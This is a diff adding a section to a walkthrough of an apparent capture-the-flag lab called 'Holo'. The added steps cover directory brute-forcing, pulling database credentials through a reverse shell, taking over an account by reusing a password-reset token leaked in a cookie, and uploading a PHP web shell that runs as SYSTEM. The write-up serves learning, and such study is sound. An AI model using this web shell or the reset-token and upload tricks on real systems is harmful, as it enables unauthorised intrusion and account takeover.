@@ -1242,15 +1242,167 @@ Start the tunnell from ligolo console using the new tun interfaces
 
 Then we can start to interact directly with the services for each hosts. I started to check PC-FILESRV01 to get a comprehensive view of the target system's SMB environment:
 
-    enum4linux -a 10.200.95.35
+    enum4linux-ng 10.200.95.35
+     ...
+    [!] Aborting remainder of tests since sessions failed, rerun with valid credentials   
+
+Same thing trying with the other hosts. There aren't shares that allows non-authenticated access, so exploit null session is not possible. I gave it a try with the credential I found but I go the same result. Then I decide to inspect the web app hosted on S-SRV01.
+Visiting http://10.200.95.31 the same login page of admin.holo.live is present. I tried with the same admin credentials but an empty page is returned. I tried to access directly the dashboard, visiting http://10.200.95.31/dashboard.php, but I recived not found error.
+I decided to proceed performing brute-force directory
+
+    gobuster dir -u http://10.200.95.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
     ...
-    [E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
+    Starting gobuster in directory enumeration mode
+    ===============================================================
+    /images               (Status: 301) [Size: 338] [--> http://10.200.95.31/images/]
+    /img                  (Status: 301) [Size: 335] [--> http://10.200.95.31/img/]
+    /Images               (Status: 301) [Size: 338] [--> http://10.200.95.31/Images/]
+    ...
+    /*checkout*           (Status: 403) [Size: 302]
+    /Img                  (Status: 301) [Size: 335] [--> http://10.200.95.31/Img/]
+    /phpmyadmin           (Status: 403) [Size: 421]
+    /webalizer            (Status: 403) [Size: 302]
+    /*docroot*            (Status: 403) [Size: 302]
+    ...
 
-Same thing trying with the other hosts, so there aren't shares that allows non-authenticated access. Then I proceeded to inspect the web site hostend on S-SRV01.
+Nothing really interesting emerged. Coming back to the site we found a reset password feature, that permits to enumerate users, plus disclose a token parameter passed as query string parameter:
 
+    http://10.200.95.31/password_reset.php?user=admin&user_token=
+The following message is returned:
+
+    Sorry, no user exists on our system with that username
+
+So having a valid user and the corresponding token (sent by email) could permits to reset the password. I decided to look form common php file to se if we can access the reset functionality directly:
+
+    gobuster dir -u http://10.200.95.31 -w /usr/share/wordlists/Common-PHP-Filenames.txt                                
+
+    Starting gobuster in directory enumeration mode
+    ===============================================================
+    /index.php            (Status: 200) [Size: 2098]
+    /login.php            (Status: 200) [Size: 208]
+    /upload.php           (Status: 302) [Size: 0] [--> index.php]
+    /home.php             (Status: 302) [Size: 0] [--> index.php]
+    /reset.php            (Status: 302) [Size: 0] [--> index.php]
+    /Index.php            (Status: 200) [Size: 2098]
+    /Upload.php           (Status: 302) [Size: 0] [--> index.php]
+    /Login.php            (Status: 200) [Size: 208]
+    /LogIn.php            (Status: 200) [Size: 208]
+    Progress: 5163 / 5164 (99.98%)
+    ===============================================================
+    Finished
+    ===============================================================
+
+So there is a reset and even an upload file, but without authentication we are redirected to the index page. So it seems that we have to find a valid user at first. I tried to brute force it with hydra using commons usenames wordlist but without any luck.
+So time to come back to my steps to further enumerate :)
+Coming back to admin.holo.live server (the Docker container hosted we compromise before), through the php reverse shell, I found some interesting files that I missed before:
+
+    www-data@0609ee91af49:/var/www/admin$ ls
+    ls
+    action_page.php
+    assets
+    dashboard.php
+    db_connect.php
+    ...
+
+Looking at the DB connect file we can get the credentials to access mysql DB:
+
+    cat db_connect.php
+    <?php
+    
+    define('DB_SRV', '192.168.100.1');
+    define('DB_PASSWD', "!123SecureAdminDashboard321!");
+    define('DB_USER', 'admin');
+    define('DB_NAME', 'DashboardDB');
+    
+    $connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);
+    
+    if($connection == false){
+    
+            die("Error: Connection to Database could not be made." . mysqli_connect_error());
+    }
+    ?>
+We can try to dump the DB and proceed to download the file, if you prefer you can use the ligolo tunnel to connect directly from your machine to the remote Mysql host. For sake of learning I dumped the DB to a file, saved in a location we have write permission as user www-data, that of course we can reach with HTTP. The following command should be self-explanatory:
+
+    mysqldump -u admin -h 192.168.100.1 -p DashboardDB > /var/www/wordpress/db.sql
+
+Then we can dowload the file hitting the following URL:
+
+    www.holo.live/db.sql
+
+Inspecting the dump file we can found actually another username:
+    
+    ...
+    LOCK TABLES `users` WRITE;
+    /*!40000 ALTER TABLE `users` DISABLE KEYS */;
+    INSERT INTO `users` VALUES ('admin','DBManagerLogin!'),('gurag','AAAA');
+    ...
+
+I proceeded to try the new found credentials:
+
+    http://10.200.95.31/login.php?user=gurag&password=AAAA
+
+But I got invalid username and password. Then I tried to recover the password:
+
+    http://10.200.95.31/password_reset.php?user=gurag&user_token=
+
+I got the following response:
+
+    An email has been sent to the email associated with your username
+
+So the user exists. But I don't have access to the token of course. I decided to inspect the flow using Burp. Inspecting the reset request I found that the user token is also returned as cookie:
+-->
+
+    GET /password_reset.php?user=gurag&user_token= HTTP/1.1
+    ...
+<--
+    
+    HTTP/1.1 200 OK
+    ...
+    Set-Cookie: user_token=934e02cb6c5c6f5d345b55bedb26940c42a7f17ffa119d400ba154ea3ec0b69d860002b8053f27513b6b5440a0a7d5d52dfb
+
+Actually this thing it's not so strange, sometime during the development of an application such type of things could be present in order to test an app. Anyway, let's try to append the cookie value to the QS parameter:
+
+    http://10.200.95.31/password_reset.php?user=gurag&user_token=934e02cb6c5c6f5d345b55bedb26940c42a7f17ffa119d400ba154ea3ec0b69d860002b8053f27513b6b5440a0a7d5d52dfb
+
+And we land to the reset page. Just insert the username as gurag, a new password and we are good to go!
+
+    http://10.200.95.31/password_update.php?user=gurag&password=Pwd12345
+
+You get a positive response:
+
+    Password successfuly updated!
+    HOLO{.......................}
+
+Then we can proceed to login using the new password. Then we are presented with a button to uoload an image, clicking we are redirected to:
+
+    http://10.200.95.31/img_upload.php?
+
+Let's try to check if there are filter on the file type we can upload (of course only images should be allowed). Let's try to upload a basic webshell:
+
+    <?php if(isset($_GET['c'])) {system($_GET['c']);} ?>
+
+
+The server does not check the file type at all:
+
+
+    The file ws.php has been uploaded.
+
+
+We don't know where the webshell hase been uploaded, but coming back to the directory brute force excercise we can try two options:
+
+    /images               (Status: 301) [Size: 338] [--> http://10.200.95.31/images/]
+    /img                  (Status: 301) [Size: 335] [--> http://10.200.95.31/img/]
     
 
-    
+The webshell can be find to this URI:
+
+    http://10.200.95.31/images/ws.php?c=whoami
+
+And the web server is running as system:
+
+    nt authority\system
+
+
 
     
 
